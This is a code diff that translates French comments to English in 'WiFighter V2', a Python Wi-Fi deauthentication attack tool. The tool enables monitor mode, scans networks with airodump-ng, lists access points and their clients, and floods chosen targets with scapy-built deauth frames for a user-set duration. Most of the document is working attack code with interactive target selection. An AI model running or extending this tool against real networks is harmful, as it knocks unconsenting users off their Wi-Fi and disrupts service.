@@ -13,22 +13,21 @@ from typing import Dict, List, Optional, Tuple
 
 from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp, conf
 
-conf.verb = 0  # désactiver les messages verbeux de scapy
+conf.verb = 0  # disable scapy verbose messages
 
 SCAN_FILE_PREFIX = "wifighter_scan"
 
-# === Couleurs terminal ===
+# Terminal colors
 RED = "\033[91m"
 YELLOW_BOLD = "\033[1;93m"
 RESET = "\033[0m"
 
-# --- Utilitaires ---
+# Utilities
 
 
 def banner() -> None:
     os.system("clear")
-    print(f"""{RED}
-                                                                       
+    print(f"""{RED}                                                                     
   ▄▄▄             ▄▄                                 ▄▄▄         ▄▄▄▄  
  █▀██  ██  ██▀▀  ██          █▄    █▄               █▀██  ██▀▀ ▄██████ 
    ██  ██  ██ ▀▀▄██▄▀▀    ▄▄ ██   ▄██▄      ▄         ██  ██   ▀█▄  ██ 
@@ -37,20 +36,21 @@ def banner() -> None:
    ▀████▀███▀▄██▄██▄██▄▀████▄██ ██▄██▄▀█▄▄▄▄█▀         ▀███▀   ██████▄ 
                  ██       ██                                           
                 ▀▀      ▀▀▀                                            
+
 {YELLOW_BOLD}
             >>> WiFighter V2 — Deauth Tool by H8Laws  <<<
 {RESET}""")
 
 
 def ensure_root() -> None:
-    """Vérifie que le script est exécuté en root."""
+    """Check that the script is run as root."""
     if os.geteuid() != 0:
         print(f"{RED}[-] This tool must be run as root.{RESET}")
         sys.exit(1)
 
 
 def clean_scan_files() -> None:
-    """Supprime les anciens fichiers de scan correspondant au préfixe."""
+    """Delete old scan files matching the prefix."""
     for file in glob.glob(f"{SCAN_FILE_PREFIX}-*.csv"):
         try:
             os.remove(file)
@@ -60,8 +60,8 @@ def clean_scan_files() -> None:
 
 def find_latest_scan_csv() -> Optional[str]:
     """
-    Retourne le chemin du dernier fichier CSV généré par airodump-ng
-    correspondant au préfixe SCAN_FILE_PREFIX-*.csv.
+    Return the path of the most recent CSV file created by airodump-ng
+    matching the prefix SCAN_FILE_PREFIX-*.csv.
     """
     files = glob.glob(f"{SCAN_FILE_PREFIX}-*.csv")
     if not files:
@@ -70,18 +70,18 @@ def find_latest_scan_csv() -> Optional[str]:
     return files[0]
 
 
-# === Interfaces ===
+# Wi-Fi interfaces and monitor mode
 
 
 def get_interfaces() -> List[str]:
     """
-    Récupère les interfaces Wi-Fi présentes via `iwconfig`.
-    Retourne une liste d'interfaces (ex: ['wlan0', 'wlan1'])
+    Retrieve Wi-Fi interfaces via `iwconfig`.
+    Returns a list of interface names (e.g., ['wlan0', 'wlan1']).
     """
     try:
         out = subprocess.check_output(["iwconfig"], stderr=subprocess.DEVNULL).decode()
     except (subprocess.CalledProcessError, FileNotFoundError):
-        # Fallback si iwconfig non présent -> essayer ip link
+        # Fallback if iwconfig is not available -> try ip link
         try:
             out = subprocess.check_output(["ip", "-brief", "link"]).decode()
         except Exception:
@@ -89,32 +89,32 @@ def get_interfaces() -> List[str]:
 
     interfaces = []
     for line in out.splitlines():
-        # Ligne commence par "wlan0     IEEE 802.11  ..."
+        # Line starts like "wlan0     IEEE 802.11  ..."
         m = re.match(r"^([^\s:]+)\s+.*IEEE 802.11", line)
         if m:
             iface = m.group(1).strip()
             interfaces.append(iface)
         else:
-            # Parfois iwconfig affiche l'interface sur la ligne suivante, tenter heuristique
+            # Heuristic: sometimes iwconfig shows the interface on the next line
             parts = line.split()
             if parts and re.match(r"^wlan|^wl", parts[0]):
                 interfaces.append(parts[0])
-    # uniq
+    # unique
     return list(dict.fromkeys(interfaces))
 
 
 def enable_monitor_mode(interface: str) -> str:
     """
-    Passe l'interface en mode monitor avec airmon-ng.
-    IMPORTANT: conformément à la demande, on n'exécute que `airmon-ng start`.
-    Aucun `airmon-ng stop` ou tentative d'arrêt automatique n'est faite ici.
-    Retourne le nom de l'interface monitor (ex: wlan0mon) si détecté,
-    sinon retourne l'interface d'origine.
+    Put the interface into monitor mode using airmon-ng.
+    IMPORTANT: only `airmon-ng start` is executed.
+    No automatic `airmon-ng stop` or shutdown attempts are performed here.
+    Returns the monitor interface name (e.g., wlan0mon) if detected,
+    otherwise returns the original interface.
     """
     print(f"[+] Enabling monitor mode on {interface} (only running 'airmon-ng start')...")
     subprocess.run(["airmon-ng", "start", interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
-    # Rechercher l'interface monitor via iwconfig (Mode:Monitor) ou suffixe mon
+    # Search for the monitor interface via iwconfig (Mode:Monitor) or suffix 'mon'
     try:
         out = subprocess.check_output(["iwconfig"], stderr=subprocess.DEVNULL).decode()
     except Exception:
@@ -127,7 +127,7 @@ def enable_monitor_mode(interface: str) -> str:
             break
 
     if not mon_iface:
-        # fallback: chercher une interface avec suffixe 'mon'
+        # fallback: look for an interface with suffix 'mon'
         for line in out.splitlines():
             m = re.match(r"^([^\s:]+) ", line)
             if m and m.group(1).endswith("mon"):
@@ -144,25 +144,25 @@ def enable_monitor_mode(interface: str) -> str:
 
 def disable_monitor_mode(mon_iface: str) -> None:
     """
-    Ne désactive PAS automatiquement le monitor mode (conforme au souhait).
-    On affiche juste un rappel informatif.
-    Si l'utilisateur souhaite arrêter le mode moniteur, il doit le faire manuellement:
+    Does NOT automatically disable monitor mode (per user preference).
+    We only display an informational reminder.
+    If the user wants to stop monitor mode, they should do it manually:
       sudo airmon-ng stop <interface>
     """
     print(f"[!] monitor mode not stopped automatically for {mon_iface} (per user preference).")
 
 
-# === Airodump ===
+# Airodump
 
 
 def run_airodump(interface: str) -> subprocess.Popen:
     """
-    Lance airodump-ng en écrivant CSV avec préfixe SCAN_FILE_PREFIX.
-    Retourne l'objet Popen.
+    Launch airodump-ng writing CSV files with prefix SCAN_FILE_PREFIX.
+    Returns the Popen object.
     """
     clean_scan_files()
     print("[+] Scanning... (Ctrl+C to stop)")
-    # airodump-ng va créer SCAN_FILE_PREFIX-01.csv, -02.csv ... on prendra le plus récent
+    # airodump-ng will create SCAN_FILE_PREFIX-01.csv, -02.csv ... we'll take the latest
     proc = subprocess.Popen(
         ["airodump-ng", "-w", SCAN_FILE_PREFIX, "--output-format", "csv", interface],
         stdout=subprocess.DEVNULL,
@@ -172,7 +172,7 @@ def run_airodump(interface: str) -> subprocess.Popen:
 
 
 def stop_airodump(proc: subprocess.Popen, timeout: float = 5.0) -> None:
-    """Arrête proprement airodump-ng."""
+    """Stop airodump-ng cleanly."""
     if proc.poll() is None:
         try:
             proc.send_signal(signal.SIGINT)
@@ -188,67 +188,67 @@ def stop_airodump(proc: subprocess.Popen, timeout: float = 5.0) -> None:
                 pass
 
 
-# === Parsing CSV airodump-ng ===
+# Parsing airodump-ng CSV
 
 
 def parse_scan_results(filename: str) -> Tuple[List[Dict[str, str]], Dict[str, List[str]]]:
     """
-    Parse le CSV généré par airodump-ng et retourne:
-    - aps: liste de dict {bssid, channel, essid, power}
+    Parse the CSV generated by airodump-ng and return:
+    - aps: list of dicts {bssid, channel, essid, power}
     - clients: dict mapping ap_bssid -> [client_mac, ...]
-    Le parsing est robuste face aux variations d'index de colonnes (on utilise les headers).
+    Parsing is robust to variations in column indices (we use headers).
     """
     aps: List[Dict[str, str]] = []
     clients: Dict[str, List[str]] = {}
 
     with open(filename, "r", encoding="utf-8", errors="ignore") as f:
         reader = csv.reader(f)
-        section = "aps"  # "aps" jusqu'à ce qu'on rencontre "Station MAC"
+        section = "aps"  # 'aps' until we encounter 'Station MAC'
         headers_map = {}
         for row in reader:
             if not any(cell.strip() for cell in row):
-                # ligne vide -> continue
+                # empty row -> continue
                 continue
             first = row[0].strip()
-            # détecter début des sections via en-têtes
+            # detect start of sections via headers
             if first.startswith("BSSID"):
-                # header de la section AP
+                # header for the AP section
                 section = "aps"
                 headers_map = {h.strip(): i for i, h in enumerate(row)}
                 continue
             if first.startswith("Station MAC"):
-                # header de la section clients
+                # header for the clients section
                 section = "clients"
                 headers_map = {h.strip(): i for i, h in enumerate(row)}
                 continue
 
             if section == "aps":
-                # on attend au moins les colonnes BSSID, CH, ESSID, Power (ou PWR)
+                # expect at least columns BSSID, CH, ESSID, Power (or PWR)
                 try:
                     bssid = row[headers_map.get("BSSID", 0)].strip()
                     channel = row[headers_map.get("CH", 3)].strip() if "CH" in headers_map else row[3].strip()
-                    # ESSID colonne parfois "ESSID" ou à la fin
+                    # ESSID column sometimes "ESSID" or at the end
                     essid = ""
                     if "ESSID" in headers_map:
                         essid = row[headers_map["ESSID"]].strip()
                     else:
-                        # fallback: prendre la dernière colonne souvent utilisée
+                        # fallback: take the last column which is often used
                         essid = row[-1].strip()
                     power = ""
                     if "PWR" in headers_map:
                         power = row[headers_map["PWR"]].strip()
                     elif "Power" in headers_map:
                         power = row[headers_map["Power"]].strip()
-                    # ignorer lignes vides ESSID
+                    # ignore empty ESSID or BSSID lines
                     if essid == "" or bssid == "":
                         continue
                     aps.append({"bssid": bssid, "channel": channel, "essid": essid, "power": power})
                     clients[bssid] = []
                 except Exception:
-                    # ignorer malformations
+                    # ignore malformed lines
                     continue
             elif section == "clients":
-                # colonnes: Station MAC, First time, Last time, Power, Packets, BSSID, Probed ESSIDs
+                # columns: Station MAC, First time, Last time, Power, Packets, BSSID, Probed ESSIDs
                 try:
                     client_mac = row[headers_map.get("Station MAC", 0)].strip()
                     ap_mac = (
@@ -264,7 +264,7 @@ def parse_scan_results(filename: str) -> Tuple[List[Dict[str, str]], Dict[str, L
     return aps, clients
 
 
-# === Affichage utilitaire ===
+# Display utilities
 
 
 def print_ap_list(aps: List[Dict[str, str]]) -> None:
@@ -278,7 +278,7 @@ def print_ap_list(aps: List[Dict[str, str]]) -> None:
         print(f"   {i+1:<2}   {essid:<20}  {ch:<4}  {pwr:<4}  {bssid}")
 
 
-# === Attaque deauth ===
+# Deauth attack
 
 
 def set_channel(interface: str, channel: int) -> None:
@@ -294,14 +294,14 @@ def deauth_attack(
     stop_event: Optional[Event] = None,
 ) -> None:
     """
-    Lance une attaque DEAUTH sur un AP et ses clients (si fournis).
-    stop_event permet d'interrompre l'attaque depuis l'extérieur.
+    Launch a DEAUTH attack on an AP and its clients (if provided).
+    stop_event allows the attack to be interrupted from outside.
     """
     print(f"[+] Launching DEAUTH attack on {ap_mac} (CH {channel}) for {duration}s...")
     try:
         set_channel(interface, int(channel))
     except Exception:
-        # ignore si conversion échoue
+        # ignore if conversion fails
         pass
 
     packets = []
@@ -321,7 +321,7 @@ def deauth_attack(
                 break
             for pkt in packets:
                 sendp(pkt, iface=interface, verbose=0)
-            # légère pause pour ne pas saturer CPU totalement
+            # small pause to avoid maxing out CPU
             time.sleep(0.1)
     except KeyboardInterrupt:
         pass
@@ -329,14 +329,14 @@ def deauth_attack(
     print("[+] End of the attack.")
 
 
-# === Main interactive flow ===
+# Main interactive flow
 
 
 def interactive_main(mon_iface: str) -> None:
-    # Lancer airodump
+    # Start airodump
     proc = run_airodump(mon_iface)
     try:
-        # attendre la capture avec possibilité d'interruption depuis clavier
+        # wait for capture with keyboard interrupt support
         while True:
             time.sleep(1)
     except KeyboardInterrupt:
@@ -370,16 +370,16 @@ def interactive_main(mon_iface: str) -> None:
                 if 0 <= idx < len(aps):
                     targets.append(aps[idx])
 
-    # durée optionnelle
+    # optional duration
     try:
         dur = int(input("[?] Duration per target in seconds (default 60): ").strip() or "60")
     except Exception:
         dur = 60
 
-    # Event pour permettre interruption propre des attaques
+    # Event to allow graceful stopping of attacks
     stop_event = Event()
 
-    # Handler Ctrl+C pour arrêter les attaques proprement
+    # Ctrl+C handler to stop attacks cleanly
     def _signal_handler(sig, frame):
         print("\n[+] Stopping attacks...")
         stop_event.set()
@@ -388,14 +388,14 @@ def interactive_main(mon_iface: str) -> None:
 
     for ap in targets:
         clients = all_clients.get(ap["bssid"], [])
-        # lancer l'attaque dans un thread pour pouvoir la stopper
+        # run attack in a thread so it can be stopped
         t = Thread(target=deauth_attack, args=(ap["bssid"], ap["channel"], mon_iface, dur, clients, stop_event))
         t.start()
         t.join()
         if stop_event.is_set():
             break
 
-    # restaurer handler
+    # restore handler
     signal.signal(signal.SIGINT, old_handler)
     disable_monitor_mode(mon_iface)
 
@@ -432,10 +432,10 @@ def main() -> None:
             time.sleep(1)
             continue
 
-        # Activer monitor mode (uniquement 'airmon-ng start')
+        # Enable monitor mode (only run 'airmon-ng start')
         mon_iface = enable_monitor_mode(iface)
 
-        # mode interactif principal
+        # main interactive mode
         interactive_main(mon_iface)
 
         again = input("\n[?] Restart a scan ? (y/n) : ").strip().lower()
